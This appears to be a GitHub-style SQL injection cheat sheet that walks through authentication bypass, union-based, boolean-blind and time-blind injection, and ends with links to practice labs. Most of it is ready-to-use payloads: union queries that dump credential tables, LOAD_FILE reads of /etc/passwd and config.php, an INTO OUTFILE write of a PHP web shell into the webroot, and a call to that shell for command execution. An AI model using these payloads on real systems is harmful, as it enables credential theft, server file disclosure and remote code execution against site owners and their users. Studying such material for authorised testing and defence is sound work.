# SQL Injection
![sql-injection](https://user-images.githubusercontent.com/79256105/172219613-c1e688dc-d2fc-4a1c-9e56-35cb868ae5f2.png)

# What is SQL Injection?
SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
# Types of SQL Injection
![sql](https://user-images.githubusercontent.com/79256105/175160165-af1189b5-f22c-41fa-8d8e-7e4e1d14da57.png)

## Authentication Bypass(Subverting Query Logic)
Subverting Query Login used to bypass authenticatio of login page . In this technique, hacker used true statement **' or 1=1 / ' or '1'='1'-- -** to bypass application query or user credentials matching.
Some True Statement Payload :
                   
                   ' or '1' = '1
                   ' or '1' = '1’
                   ' or '1' = '1 -- -
                   ' or '1' = '1 #                         
##### 👁️‍🗨️ For More Payload check payload all things github repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
## In-Band SQL Injection
In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: **Union Based and Error Based.**

##### Error Based :
                           Get the PHP or SQL errors in the front-end
##### Union Based:
                          Get Fixed Column number and Uses Union query to get database information

## How to Indentify Error Based SQL Injection
#### Step1:
           Find out injection parameter using fuzzing tools or manually
#### Step2:
           Use Given below payoad

         Payload 	URL Encoded
              ' 	%27
              " 	%22
              # 	%23
              ; 	%3B
              ) 	%29
If we get sql error , there has error based SQL injection and then, Use SQL Map for Automatic SQL Injection Pen-Testing / Manually Testing
##### 👁️‍🗨️ For More Payload check payload all things github repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
## How to identify Union Base SQL Injection
#### Step1:
          find out actual column number using order by  / order by -- - operation
#### Step2:
            use actual column number with union operation
            example: ‘ union select 1,2,3-- - 
#### Step3:
           check which column number show in your target website
#### Step4:
           use union base payload in perfect column number to exploit database

## Method for dumping data from database using Uninon SQL Injection

##### Schema,Schemata check

      mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

#### Step 1: Schema/Database check

     ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

#### Step 2: Tables check

      ' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Here , dev is database name which will replace to your target database name

#### Step3: Columns check

      ' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

Here , credentials is table name whick will replace to your target table name

#### Step4: Dum Data from table:

      ' UNION select 1, username, password, 4 from dev.credentials-- -

Where username and password are column name , dev is database name , credentials is table name

## Read Data/Sensitive files using Union SQL Injection
     SELECT USER()
     SELECT CURRENT_USER()
     SELECT user from mysql.user

#### Step 1:Privilege Check

      SELECT super_priv FROM mysql.user
      ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
      ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
      ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
#### Step 2:Load File
Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:

      SELECT LOAD_FILE('/etc/passwd');
      
      Example:
      ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

#### Another Example

We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.

      ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
      ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
### Write Files Using Union SQL Injection or RCE Using SQL Injection
Example

      ' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
Web Shell Upload:

      ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
      
Basic PHP Web Shell:

      <?php system($_REQUEST['cmd']); ?>
      
OR 
      
      <?php system($_GET['cmd']); ?>
 
### For RCE , Call Uploaded Web shell 

Example :
          
          url/upload_file.php?parameter=commnad

          http://cyberteach360/shell.php?cmd=id
# Boolean Based SQL Injection
Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.

#### Step 1:Find out actual column number

      1.admin123' UNION SELECT 1;-- 
      2.admin123' UNION SELECT 1,2,3;--
if response is true till 1,2,3 but flase in 1,2,3,4 ,the target column ***number is 3***

#### Step 2:Find out database name

      admin123' UNION SELECT 1,2,3 where database() like 'some character%';--
      example:
              admin123' UNION SELECT 1,2,3 where database() like 's%';--
 
 Sequentially change the character and check the respons is true or flase
 suppose we got the ***database name  :sqli_three***
 
#### Step 3:Find out table name
 
 
      admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--         
      
Sequentially change the character and check the respons is true or flase
suppose we got the ***table name  :users***
#### Step 4:Find out Column name
     
      admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

After,sequentially Repeating this process you will get column name.
suppose, the ***column name username and another is password***

#### Step 5:Find out username column value
      
      admin123' UNION SELECT 1,2,3 from users where username like 'a%
 
 After,sequentially Repeating this process you will get ***column username value and this is:admin.***
 
#### Step 6:Find out password column value

        admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

if you properly do this , you will get ***password and the credentials are username=admin ,password=3356 ***

# Time Base SQL Injection

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as ***SLEEP(x)*** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
So, for example, when trying to establish the number of columns in a table, you would use the following query:
      
      admin123' UNION SELECT SLEEP(5);--
      
#### Step 1:Find out actual column number
      
      admin123' UNION SELECT SLEEP(5);--
If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
      
      admin123' UNION SELECT SLEEP(5),2;--
if again no pause in the response time , increase column number like
      
      admin123' UNION SELECT SLEEP(5),2,3;--
### Step 2:Find out dabase name 
      admin123' UNION SELECT SLEEP(5),2,3 where database() like 'u%';--
Here dabase ***name :sqli_four***     
### Step 3:Find out table name
      admin123' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
Here ***table name:users***

#### Step4:Find out Column name
      
      admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
Here Column name ***username and password***

#### Step5:Findout Column value
      admin123' UNION SELECT SLEEP(5),2,3 from users where username like 'a%
 Here ***username:admin***
      admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
 Here ***password:pass***
 SO the target login credentials 
                                ***username:admin
                                password:pass***
## Practicing and Learning Resources:

#### Try Hack Me :

      https://tryhackme.com/room/sqlinjectionlm
      https://tryhackme.com/room/sqhell

#### Hack The Box Academy :

      https://academy.hackthebox.com/module/33/section/177

#### Port Swigger:         
     https://portswigger.net/web-security/sql-injection
     
